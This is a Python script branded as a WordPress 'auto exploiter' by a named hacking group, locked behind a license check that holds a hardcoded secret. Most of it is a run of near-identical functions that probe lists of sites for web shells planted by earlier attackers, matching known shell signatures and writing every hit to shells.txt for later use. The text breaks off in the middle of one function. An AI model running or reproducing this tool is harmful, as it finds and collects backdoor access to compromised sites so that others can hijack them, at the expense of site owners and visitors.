# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from pathlib import Path 
import os
os.system("pip install keyauth")
from keyauth import api
import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
import concurrent.futures
if sys.version_info.minor < 10: 
    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))

if platform.system() == 'Windows':
    os.system('cls & title Python Example')  
elif platform.system() == 'Linux':
    os.system('clear')  
    sys.stdout.write("\x1b]0;Python Example\x07")
elif platform.system() == 'Darwin':
    os.system("clear && printf '\e[3J'")  
    os.system('''echo - n - e "\033]0;Python Example\007"''') 
print("Initializing....")
def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest
keyauthapp = api(
    name = "ravi", 
    ownerid = "kIik4ediGG", 
    secret = "7b47d1595972c84c46cfb7d0e834b98065ba5f34d6fe362cbea60b4475ff34d9", 
    version = "1.0",
    hash_to_check = getchecksum()
)
os.system('cls' if os.name == 'nt' else 'clear')
r ="""\033[1;32;40m
    ___ _    _____       ____  ____  ______
   /   | |  / /   |     / __ )/ __ \/_  __/
  / /| | | / / /| |    / __  / / / / / /
 / ___ | |/ / ___ |   / /_/ / /_/ / / /
/_/  |_|___/_/  |_|  /_____/\____/ /_/
                            \033[1;33;40m(Version:1.0)
                     \033[1;36;40mWp Auto Exploiter
\033[1;32;40m  Developed By TEAM BADS
                 TG: https://t.me/bads_community


"""
print(r)
print(f"\033[0;31mCurrent Session Validation Status: {keyauthapp.check()}")
print(f"\033[0;31mBlacklisted? : {keyauthapp.checkblacklist()}")  
def answer():
    try:
        print("""\033[0;32m
1.Login
2.Register
3.Upgrade
4.License Key Only
        """)
        ans = input("\033[1;33mSelect Option: ")
        if ans == "1":
            user = input('Provide username: ')
            password = input('\033[0;31mProvide password: ')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input('\033[0;31mProvide username: ')
            password = input('\033[0;31mProvide password: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.register(user, password, license)
        elif ans == "3":
            user = input('\033[0;31mProvide username: ')
            license = input('\033[0;31mProvide License: ')
            keyauthapp.upgrade(user, license)
        elif ans == "4":
            key = input('\033[0;32mEnter your license: ')
            keyauthapp.license(key)
        else:
            print("\n\033[1;33mNot Valid Option")
            time.sleep(1)
            os.system('cls')
            answer()
    except KeyboardInterrupt:
        os._exit(1)
answer()
'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''
print("\nUser data: ")
print("Username: " + keyauthapp.user_data.username)
print("IP address: " + keyauthapp.user_data.ip)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
subs = keyauthapp.user_data.subscriptions  
for i in range(len(subs)):
    sub = subs[i]["subscription"]  
    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
        '%Y-%m-%d %H:%M:%S')  
    timeleft = subs[i]["timeleft"] 

    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")
onlineUsers = keyauthapp.fetchOnline()
OU = "" 
if onlineUsers is None:
    OU = "No online users"
else:
    for i in range(len(onlineUsers)):
        OU += onlineUsers[i]["credential"] + " "
print("\n" + OU + "\n")
print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
print(f"Current Session Validation Status: {keyauthapp.check()}")
os.system("clear")
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN
os.system('cls' if os.name == 'nt' else 'clear')
print (r)
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
# try:
#     fileName = input('\033[1;31mSite Lists: ')
#     file = Path(__file__).with_name(fileName)
#     target = [i.strip() for i in file.open('r').readlines()]
# except IndexError:
#     path = str(sys.argv[0]).split('\\')
#     exit('\n\033[1;31m  [!] Enter <' + path[len(path) - 1] + '> <your list.txt>')
# poolAmount = int(input("\033[1;31mThreads: "))

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def exploit_1(url):
    try:
        #try with http
        url = 'http://'+URLdomain(url)
        check = requests.get(url+'/wp-content/themes/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print ('[#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg))
                open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
        #try with https
        else:
            url = 'https://' + URLdomain(url)
            
            check = requests.get(url+'/wp-content/themes/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print ('[#] Exploit 1 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/ccx/index.php\n')
            else:
                print ('[#] Exploit 1 --> ' + url + ' {}[Failed]'.format(fr))
            
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
        
        
        
        
def exploit_2(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/sid/sidwso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 2 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/sid/sidwso.php\n')
            else:
                print ('[#] Exploit 2 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_3(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 3 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('[#] Exploit 3 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_4(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 4 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/mar.php\n')
            else:
                print ('[#] Exploit 4 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_5(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('[#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/images/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/images/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 5 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/images/mar.php\n')
            else:
                print ('[#] Exploit 5 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_6(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print ('[#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/m4r1ju4n4.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 6 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/m4r1ju4n4.php\n')
            else:
                print ('[#] Exploit 6 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_7(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 7 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/mari.php\n')
            else:
                print (' Exploit 7 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_8(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/coffee/marijuana.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 8 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/coffee/marijuana.php\n')
            else:
                print ('[#] Exploit 8 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_9(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/colors/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 9 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/colors/maro.php\n')
            else:
                print ('[#] Exploit 9 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_10(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 10 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/mari.php\n')
            else:
                print ('[#] Exploit 10 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_11(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 11 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/mar.php\n')
            else:
                print ('[#] Exploit 11 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_12(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 12 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/css/maro.php\n')
            else:
                print ('[#] Exploit 12 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_13(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 13 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/includes/mari.php\n')
            else:
                print ('[#] Exploit 13 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_14(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/maint/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 14 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/maint/mari.php\n')
            else:
                print ('[#] Exploit 14 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_15(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 15 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/mari.php\n')
            else:
                print ('[#] Exploit 15 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_16(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 16 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/mari.php\n')
            else:
                print ('[#] Exploit 16 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_17(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 17 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mari.php\n')
            else:
                print ('[#] Exploit 17 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_18(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/aryabot/mar.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 18 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/aryabot/mar.php\n')
            else:
                print ('[#] Exploit 18 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_19(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/owfsmac/maro.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 19 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/owfsmac/maro.php\n')
            else:
                print ('[#] Exploit 19 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_20(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,timeout=15)
        if ('//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8")):
                print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/mari.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '//0x5a455553.github.io/MARIJUANA/icon.png' in check.content.decode("utf-8"):
                    print (' [#] Exploit 20 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/mari.php\n')
            else:
                print ('[#] Exploit 20 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_21(url):
    try:
        # try with http
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/hello.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 21 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/hello.php\n')
            else:
                print ('[#] Exploit 21 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_22(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/ccx/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/ccx/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print (' [#] Exploit 22 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/ccx/index.php\n')
            else:
                print ('[#] Exploit 22 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_23(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ccx/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Negat1ve Shell' in check.content.decode("utf-8")):
                print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
